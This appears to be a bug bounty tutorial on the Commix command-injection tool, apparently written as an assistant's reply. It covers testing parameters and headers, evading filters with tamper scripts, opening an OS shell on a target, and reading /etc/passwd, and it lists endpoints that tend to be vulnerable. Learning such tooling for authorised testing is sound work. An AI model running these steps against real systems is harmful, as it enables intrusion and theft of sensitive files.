# Commix-official-documentation
Alright, let's get you up to speed with using **Commix** for bug bounty. It's an automated tool that's fantastic for finding and exploiting OS command injection vulnerabilities. Think of it as `sqlmap`, but for command injection.

Here is a practical guide packed with examples relevant to a bug bounty workflow.

### 🛠️ The Core Commands You'll Use Most

Before diving into complex scenarios, here is a quick reference for the most common commands you will use. I've compiled this from the official documentation and various guides .

| Command | Purpose | Bug Bounty Use Case |
| :--- | :--- | :--- |
| `--url` or `-u` | Target URL (mark injection point with `*`)  | Testing a GET parameter. |
| `--data` | Data string for POST requests  | Testing form inputs or APIs that use POST. |
| `-r` | Load a raw HTTP request from a file (e.g., from Burp Suite)  | Quickly test a request you've already captured. |
| `--level` | Set test depth (1-3, default is 1)  | Increase to 3 to test HTTP headers like `User-Agent` and `Referer`. |
| `--cookie` | Set a Cookie header  | Test authenticated endpoints. |
| `--os-cmd` | Execute a single OS command  | Quickly confirm a vulnerability by running a command like `whoami`. |
| `--os-shell` | Get an interactive pseudo-terminal shell  | Deepen the impact after confirming a vulnerability. |
| `--tamper` | Use scripts to evade WAFs/filters  | Bypass input sanitization. |
| `--technique` | Force a specific injection technique  | Use `--technique=timebased` for blind injections. |
| `--batch` | Run in non-interactive mode, using defaults  | Automate your scans. |
| `--file-read` | Read a file from the target server  | Extract sensitive files like `/etc/passwd` or configuration files. |

---

### 💡 Bug Bounty-Focused Examples

Here are some practical scenarios you will likely encounter.

#### 1. Testing the Basics: GET and POST Parameters

This is your starting point for any parameter that looks like it might be passed to a system command, such as a `ping` or `traceroute` endpoint.

*   **Testing a GET parameter:**
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1"
    ```
    Commix will automatically test the `ip` parameter for vulnerabilities .

*   **Testing a POST parameter:**
    ```bash
    commix --url="http://target.com/submit.php" --data="host=127.0.0.1&test=abc"
    ```
    This tells Commix to test the POST body for injection points .

#### 2. Speed Up Your Testing with `--batch`

Bug bounty is a game of efficiency. The `--batch` flag tells Commix to run with default answers, so you don't have to babysit the tool .

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --batch
```

#### 3. Increasing `--level` to Test Headers

By default, Commix only tests URL parameters. To test HTTP headers like `User-Agent`, `Referer`, or `Host` for injection, you need to set `--level=3` . This is a common source of high-impact findings.

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --level=3
```
[According to the official wiki], at level 3, the `User-Agent` and `Referer` headers are also tested. The `Host` header is also included .

#### 4. From Burp Suite Request to Exploitation

You will often find an interesting request in Burp Suite. You can save that request to a file and feed it directly to Commix .

*   **Save the request:** In Burp, right-click on the request and select "Copy to file".
*   **Run Commix:**
    ```bash
    commix -r request.txt --batch
    ```
    This is a very fast way to start testing.

#### 5. Using `--tamper` to Bypass WAFs and Filters

Many applications will try to block command injection by filtering out dangerous characters. Commix has `--tamper` scripts to bypass these filters, similar to `sqlmap` .

*   **Scenario: Filtering spaces.** If the application removes spaces, use the `space2ifs` tamper script, which replaces spaces with `${IFS}` (Internal Field Separator), a valid shell alternative .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper=space2ifs
    ```
*   **Scenario: Blacklisting keywords.** The `uninitializedvariable` tamper can help bypass keyword filters (like blocking `whoami`) by adding uninitialized variables, e.g., `w${AB}hoami` .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper=uninitializedvariable
    ```

#### 6. Confirming and Exploiting: `--os-cmd` and `--os-shell`

Once Commix identifies a potential vulnerability, you need to prove impact.

*   **Execute a single command:** Use `--os-cmd` to run one command. This is great for proof-of-concept .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --os-cmd="whoami"
    ```
*   **Get an interactive shell:** For full access, use `--os-shell`. This will give you a pseudo-terminal on the target .
    ```bash
    commix --url="http://target.com/ping.php?ip=127.0.0.1" --os-shell
    ```

#### 7. Extracting Data: `--file-read`

A critical part of a report is showing what you can access. Use `--file-read` to download sensitive files .

```bash
commix --url="http://target.com/ping.php?ip=127.0.0.1" --file-read="/etc/passwd"
```

This command will attempt to read the `/etc/passwd` file and display its contents.

### 🎯 Where to Look for Command Injection

Knowing where to look will save you a lot of time. These are common patterns from real-world scenarios :

*   **Ping and traceroute endpoints:** `/ping.php?ip=...`, `/tracert?host=...`
*   **Debug or admin endpoints:** `/exec.php?cmd=...`, `/admin/execute.php`
*   **Log viewers:** That use `tail -f` or `grep` on user input.
*   **Backup/Restore functions:** That use `tar`, `zip`, or `unzip` with user-controlled filenames.
*   **Any function that interacts with the OS:** Like sending emails, converting files, or generating reports.

Good luck with your bug bounty hunting! Let me know if you run into a specific filter or scenario you need help with.
